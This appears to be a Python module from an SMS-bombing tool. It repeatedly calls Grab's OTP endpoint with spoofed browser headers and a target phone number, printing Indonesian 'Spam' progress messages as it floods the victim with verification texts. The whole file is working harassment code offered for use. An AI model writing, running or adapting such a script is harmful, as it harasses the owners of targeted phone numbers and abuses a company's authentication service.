import requests,os,sys,json
from time import sleep
from war.war import *

def grab(self, nom):
	sleep(1)
	print("")
	r = requests.Session()
	head = {
	"Host": "partner-api.grab.com",
	"Connection": "keep-alive",
	"Content-Length": "152",
	"Accept": "application/json, text/plain, */*",
	"User-Agent": "Mozilla/5.0 (Linux; Android 6.0; A1601) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
	"X-Request-ID": "40118178-4aa2-4a69-9199-6f9b81d8bef1",
	"Content-Type": "application/json",
	"Origin": "https://weblogin.grab.com",
	"Referer": "https://weblogin.grab.com/auth?acr_values=service%3APASSENGER%20consent_ctx%3AcountryCode%3DID&browser=Chrome%3A83.0&client_id=4ddf78ade8324462988fec5bfc5874c2&code_challenge=WIM1LezixhM6LGGpzekuyT7IiT0vVNLgaXpFA_JTU8s&code_challenge_method=S256&forwardedHost=partner-api.grab.com&gw=pgw&nonce=rlhJBFgkDN7CmE87&redirect_uri=https%3A%2F%2Ffood.grab.com%2Fauth%2Fcallback&request_id=40118178-4aa2-4a69-9199-6f9b81d8bef1&response_type=code&scope=openid%20profile.read%20foodweb.order%20foodweb.rewards&state=hJTNPG3",
	}

	dat = json.dumps({
	  "client_id": "4ddf78ade8324462988fec5bfc5874c2",
	  "country_code": "ID",
	  "method": "SMS",
	  "num_digits": 6,
	  "phone_number": nom,
	})

	for x in range(5):
		  cal = r.post("https://partner-api.grab.com/grabid/v1/oauth2/otp",headers=head,data=dat).text
		  if 'errors' in cal:
		      print(f"{r}[!] {c}Coba lagi dalam 1 jam")
		      sleep(2)
		      exit("")
		  else:
		      print(f"{k}[+] {c}Spam Ke {c}>> {k}"+nom)
		      sleep(30)
